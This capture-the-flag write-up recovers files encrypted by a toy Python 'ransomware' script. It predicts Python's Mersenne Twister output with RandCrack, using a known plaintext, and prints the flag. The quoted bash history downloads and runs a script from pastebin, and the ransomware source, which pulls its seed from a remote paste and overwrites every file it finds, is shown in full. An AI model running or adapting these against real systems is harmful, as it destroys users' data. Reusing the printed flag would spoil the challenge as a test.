# unm0unt41n

[library.m0unt41n.ch/challenges/unm0unt41n](https://library.m0unt41n.ch/challenges/unm0unt41n) ![](../../resources/crypto.svg) ![](../../resources/easy.svg) 

# TL;DR

We get encrypted set of files, with only one preserved original example

# The inputs provided

We get:

*   `ECSC_2022_img_10.jpg` - the only original, decrypted file that we have
*   `home.zip`, which contains the encrypted home directory:
    *   `home/.bash_history`
    *   `home/shc/solves/solves_2001-06-04.txt`
    *   (...)
    *   `home/shc/solves/solves_1996-07-07.txt`
    *   `home/shc/home.html`
    *   `home/shc/imgs/SHC_Final_2022_img_00.jpg`
    *   `home/shc/imgs/SHC_Final_2022_img_37.jpg`
    *   `home/shc/imgs/ECSC_2022_img_10.jpg`
    *   `home/shc/imgs/SHC_Final_2022_img_04.jpg`
    *   `home/shc/imgs/SHC_Final_2022_img_09.jpg`
    *   `home/shc/imgs/SHC_Final_2022_img_30.jpg`
    *   `home/shc/imgs/SHC_Final_2022_img_08.jpg`

The `.bash_history`:

```bash
whoami
ls -la
pwd
lsb_release -a
sudo -l
wget https://pastebin.com/raw/hXqpyZQB
python3 hXqpyZQB shc/
echo -n "Haha you've been hacked!" > /etc/motd
```

We can still grab the "ransomware" script from pastebin:

```python
import random
import requests
import os
from pathlib import Path
from sys import argv

s = int(requests.get("https://pastebin.com/raw/jqZGy0nL").text)
random.seed(s)

if len(argv) != 2:
    print(f"usage: {argv[0]} ransomware_target")
    exit(1)

path = Path(argv[1])
for p in sorted(path.rglob("*")):
    if os.path.isfile(p):
        print("encrypt", p)
        with open(p, "rb") as fp:
            c = fp.read()

        s = b""
        for _ in range((len(c) + 3) // 4):
            s += random.getrandbits(32).to_bytes(4, "big")
        cenc = b"".join([ bytes([s[i] ^ c[i]]) for i in range(len(c))])

        with open(p, "wb+") as fp:
            fp.write(cenc)
```

However, we can **not** get the pastebin that seeds the RNG. That would be too easy though.

# Problem analysis

Having a large chunk of decrypted / encrypted data, sounds like a good use case for
[RandCrack](https://github.com/tna0y/Python-random-module-cracker). We need to:

*   Generate the XOR "key" for known original / decrypted file
*   Seed the RandCrack with that key, split into 32-bit `int` values (note the `"big"` in the encryptor!)
*   Reproduce the encryption process, in exactly the same file order as during encryption
    (`sorted(path.rglob("*"))` helps here).
*   Start "encrypting". Initially, we will produce garbage.
*   Once we get to the known-plaintext file, start subverting the `getrandbits32()` results:
    *    For first 624 values, return them from the seed
    *    Then, return them from the `randcrack()`.

## Encryption order

Trying the original encryptor, we see that the file order is:
```
encrypt home/shc/home.html
encrypt home/shc/imgs/ECSC_2022_img_10.jpg
encrypt home/shc/imgs/SHC_Final_2022_img_00.jpg
encrypt home/shc/imgs/SHC_Final_2022_img_04.jpg
```
Good! So, we just need to skip `home.html` at the beginning. And hope that we won't need it
for the flag &#128578;

# Decryptor

```python
import re
import os
from pathlib import Path
from randcrack import RandCrack

# Create enough of a xor to get 624 ints for randcrack
dec = open('ECSC_2022_img_10.jpg', 'rb').read()
enc = open('home/shc/imgs/ECSC_2022_img_10.jpg', 'rb').read()
xor = bytes([dec[i]^enc[i] for i in range(624*4)])

# Convert the bytes to 32 bit integers, using same order as encryptor
seed = [int.from_bytes(xor[i*4:i*4+4], "big") for i in range(624)]

# Initialize randcrack
randcrack = RandCrack()
for i in range(624):
    randcrack.submit(seed[i])
rand_counter = 0

path = Path("home/shc")

# From here, it's the original "encryptor" &#128578;
for p in sorted(path.rglob("*")):
    # home.html is the first file and we don't have that. Need to skip this,
    # to make sure that the state of randcrack matches the RNG state back
    # when the file was encrypted.
    if str(p)=="home/shc/home.html":
        continue
    if os.path.isfile(p):
        print("encrypt", p)
        with open(p, "rb") as fp:
            c = fp.read()

        s = b""
        for _ in range((len(c) + 3) // 4):
            # Replace random.getrandbits(32):
            # - either get it from seed
            # - or from randcrack
            rand_counter += 1
            if rand_counter <= 624:
                getrandbits32 = seed[rand_counter-1]
            else:
                getrandbits32 = randcrack.predict_getrandbits(32)
            s += getrandbits32.to_bytes(4, "big")
        cenc = b"".join([ bytes([s[i] ^ c[i]]) for i in range(len(c))])

        with open(p, "wb+") as fp:
            fp.write(cenc)
```

This successfully decrypts the homedir and the flag is hidden in one of the `solves` files:

```
$ file home/shc/imgs/*.jpg
home/shc/imgs/ECSC_2022_img_10.jpg:      JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1200x676, components 3
home/shc/imgs/SHC_Final_2022_img_00.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1200x1800, components 3
(...)
$ file home/shc/solves/*.txt
home/shc/solves/solves_1970-05-05.txt: CSV ASCII text
home/shc/solves/solves_1971-07-22.txt: CSV ASCII text
(...)
$ grep -ri shc2023 home/shc
home/shc/solves/solves_2005-08-11.txt:shc2023{w000ps_y0u_s4y_pyth0n_54nd0m_is_n0t_t5uly_54nd0m?}
```

# Alternative solution: using Web Archive

When solving this challenge, I actually got sidetracked at first - I did not think of kicking off the
RandCrack in the **middle** of decryption. Instead, I thought we have to reproduce the process **exactly**
as it was, starting from `home.html`. However, we don't have that file in decrypted form.

... but, maybe [Internet Archive](https://web.archive.org/) does? &#128578;

First, a protip: by default, IA will add some of its own headers and JavaScript to the viewed pages. However,
[there is away](https://superuser.com/questions/828907/how-to-download-a-website-from-the-archive-org-wayback-machine)
to get the original content - you have to add `id_` to the date.

With that, we find the following distinct (per MD5) snapshots of the homepage, within the roughly interesting timeframe:

*   [20220307143203](https://web.archive.org/web/20220307143203id_/https://swiss-hacking-challenge.ch/), MD5: `3977e7288f5d45c92cc4910c88c1ad49`, size: 19787b
*   [20220314102728](https://web.archive.org/web/20220314102728id_/https://swiss-hacking-challenge.ch/), MD5: `87396ababc71a8bb3b37be6f4b148c67`, size: 19787b
*   [20230306181106](https://web.archive.org/web/20230306181106id_/https://swiss-hacking-challenge.ch/), MD5: `f75d434bb3ca370cd8455bb11913c383`, size: 13471b
*   [20230515044336](https://web.archive.org/web/20230515044336id_/https://swiss-hacking-challenge.ch/), MD5: `af9476d356a0e035e559f44aefe64843`, size: 13472b
*   [20231206015805](https://web.archive.org/web/20231206015805id_/https://swiss-hacking-challenge.ch/), MD5: `e82230effeaad52b9010dcf44b7c3094`, size: 13364b


Unfortunately, none of them match the length of the provided `home.html`. But, remember, we don't need
**entire** file, just that the first `(624*4)` bytes match. So, maybe we can use one of these to decrypt
the entire archive?

... and sure enough, one of them works!

```python
dec = open('archive/20230306181106.html', 'rb').read()
enc = open('home/shc/home.html', 'rb').read()
xor = bytes([dec[i]^enc[i] for i in range(624*4)])
seed = [int.from_bytes(xor[i*4:i*4+4], "big") for i in range(624)]

randcrack = RandCrack()
for i in range(624):
    randcrack.submit(seed[i])
rand_counter = 0

path = Path("home/shc")
for p in sorted(path.rglob("*")):
    if os.path.isfile(p):
        print("encrypt", p)
        with open(p, "rb") as fp:
            c = fp.read()
        s = b""
        for _ in range((len(c) + 3) // 4):
            rand_counter += 1
            if rand_counter <= 624:
                getrandbits32 = seed[rand_counter-1]
            else:
                getrandbits32 = randcrack.predict_getrandbits(32)
            s += getrandbits32.to_bytes(4, "big")
        cenc = b"".join([ bytes([s[i] ^ c[i]]) for i in range(len(c))])
        with open(p, "wb+") as fp:
            fp.write(cenc)
```

---

## `shc2023{w000ps_y0u_s4y_pyth0n_54nd0m_is_n0t_t5uly_54nd0m?}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
